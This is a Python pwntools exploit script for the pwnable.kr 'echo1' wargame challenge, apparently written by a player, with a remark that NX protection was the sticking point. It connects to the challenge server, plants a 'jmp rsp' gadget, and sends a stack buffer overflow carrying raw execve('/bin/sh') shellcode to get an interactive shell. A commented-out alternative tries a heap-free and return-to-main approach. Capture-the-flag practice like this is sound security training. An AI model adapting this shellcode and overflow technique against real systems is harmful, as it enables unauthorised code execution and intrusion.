'''

    This challenge took me WEEKS because I didn't check to see if it had NX protection!!!!

'''

from pwn import *

elf = context.binary = ELF("echo1")
context.terminal = ["tmux", "splitw", "-h"]

gs = '''
    break *0x40086b
    continue
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

#io = start()
io = remote("pwnable.kr", 9010)

# ===========================================

free = 0x40089c
echo_function = 0x40081
main = 0x4008b1
ret = 0x400607
name = 0x6020a0

# jump to stack and have shellcode inside stack
io.sendlineafter(b"name? :", asm("jmp rsp"))

io.sendlineafter(b"> ", b"1")

#shell = asm(shellcraft.sh())
shell = b"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
payload = shell + b"A" * (0x28 - len(shell)) + p64(name) + shell
io.sendline(payload)

'''
# free the chunk
io.sendlineafter(b"name? :", b"A")
io.sendlineafter(b"> ", b"4")
io.sendlineafter(b"(y/n)", b"n")

io.sendlineafter(b"> ", b"1")

# get mangle bytes and overflow back into main
io.recvuntil(b"hello ")
mangle = io.recvline()
info("Mangle bytes: " + hex(int.from_bytes(mangle, "little")))

payload = b"A" * 0x29 + p64(ret) + p64(main)
io.sendline(payload)

#io.sendlineafter(b"name? :", b"B"*4)
'''

# ===========================================

io.interactive()

